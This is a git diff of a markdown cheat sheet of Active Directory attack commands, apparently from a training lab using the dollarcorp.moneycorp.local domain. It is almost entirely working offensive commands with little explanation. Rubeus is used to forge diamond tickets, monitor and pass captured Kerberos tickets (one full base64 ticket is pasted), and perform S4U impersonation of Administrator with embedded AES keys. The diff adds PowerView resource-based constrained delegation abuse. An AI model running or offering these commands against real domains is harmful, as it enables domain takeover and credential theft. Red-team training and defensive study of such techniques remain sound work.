@@ -38,17 +38,20 @@ C:\AD\Tools\Rubeus.exe asktgs /ticket:C:\AD\trust_moneycorp.kirbi /service:cifs/
 ```
 
 ## Diamon Ticket
+
 ```
 C:\AD\Tools\Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 
 ## Constrained Delegation
+
 ```
 C:\Users\Public\Rubeus.exe monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
 ```
 ```
 C:\AD\Tools\Rubeus.exe ptt /ticket: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
 ```
+
 ## Unconstrained Delegation
 Impersonate for user:
 ```
@@ -69,4 +72,15 @@ name           msds-allowedtodelegateto
 DCORP-ADMINSRV {TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL, TIME/dcorp-DC}
 
 C:\Windows\system32>C:\AD\Tools\Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:HTTP /ptt
+```
+## Constrained Delegation Base Resource
+
+```
+PS C:\Users\Administrator\.jenkins\workspace\Project0> Set-DomainRBCD -Verbose -Identity dcorp-mgmt -DelegateFrom DCORP-STD162$
+```
+```
+PS C:\Users\Administrator\.jenkins\workspace\Project0> Get-DomainRBCD -Verbose
+```
+```
+C:\Windows\system32>C:\AD\Tools\Rubeus.exe s4u /user:dcorp-std162$ /aes256:732b0bcff73f3658d123866dee2395b0085603cec814d990c9c04c461c7fb5a4 /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
 ```
